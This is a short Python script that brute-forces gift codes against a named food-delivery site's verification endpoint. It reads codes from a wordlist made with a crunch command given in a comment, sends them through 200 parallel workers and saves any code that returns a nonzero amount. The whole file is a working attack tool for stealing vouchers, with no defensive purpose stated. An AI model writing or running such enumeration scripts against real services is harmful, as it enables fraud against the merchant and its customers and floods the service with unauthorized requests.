import time
import json
import requests
from multiprocessing import Pool

def send(code):
    data = {
        'gift_code': code,
        'vendor_code': 'pvvo1p'
    }
    r = requests.post('https://www.zoodfood.com/order/gift/verify', data=data)
    return json.loads(r.text)[u'amount']

def saveDiscount(code):
    f = open('saved.txt', 'a')
    f.write(code + "\n")
    f.close()

def workerFunc( (start, step) ):
    global l

    for i in range(start, len(l), step):
        while True:
            try:
                if i % 100 == 0:
                    print "get", i, "->", l[i]
                r = send(l[i])
                if r != 0:
                    print "shit! ", l[i]
                    saveDiscount(l[i])
                break
            except:
                print("error!")
                time.sleep(10)

# run 'crunch 10 10 -t DUNRO,,%%, -o list.txt' before it!
listFile = open('list.txt')
l = listFile.readlines()
for i in range(len(l)):
    l[i] = l[i][:-1]

workers = 200
p = Pool( workers )
p.map(workerFunc, [ (start, workers) for start in range(workers) ])
